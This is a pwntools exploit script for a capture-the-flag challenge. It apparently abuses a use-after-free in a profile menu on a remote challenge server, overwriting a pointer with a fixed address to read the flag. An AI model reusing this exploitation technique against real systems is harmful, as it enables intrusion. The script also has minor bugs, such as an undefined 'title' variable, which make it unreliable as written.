from pwn import *

_FILE = "./challenge"



def create_profile(p, name):
    p.recvuntil("Option: ")
    p.sendline('1')
    p.recvuntil('Enter a name: ')
    p.sendline(name)


def open_profile(p, Id):
    if (int(Id)<=1):
        print("failed")
    p.recvuntil("Option: ")
    p.sendline(str(Id))

def change_name(p, name):
    p.recvuntil("Option: ")
    p.sendline('1')
    p.sendline(name)

def add_note(p, body):
    p.recvuntil("Option: ")
    p.sendline("2")
    p.recvuntil("title: ")
    p.sendline(title)
    p.recvuntil("body: ")
    p.sendline(body)

def readfile_menu(p):
    p.recvuntil("Option: ")
    p.sendline("3")

def delete_profile(p):
    p.recvuntil("Option: ")
    p.sendline("4")

def return_to_main(p):
    p.recvuntil("Option: ")
    p.sendline("5")

def read_flag(p):
    p.recvuntil("Option: ")
    p.sendline("3")
    print(p.clean().decode("latin-1"))


_likable = 0x8048d82
_flag = 0x8048d9e

#p = process(_FILE)
p = remote('challenges.0x0539.net', 3004)

create_profile(p, "Alba")
create_profile(p, "leet")
create_profile(p, "0x539")

#open_profile(p, 4)

#delete_profile(p)

open_profile(p, 3)

delete_profile(p)
#return_to_main(p)

open_profile(p, 2)

delete_profile(p)
#return_to_main(p)

open_profile(p, 2)

change_name(p, p32(0x804b060))

return_to_main(p)

open_profile(p, 3)

change_name(p, "hoho!")

readfile_menu(p)

read_flag(p)

p.interactive()
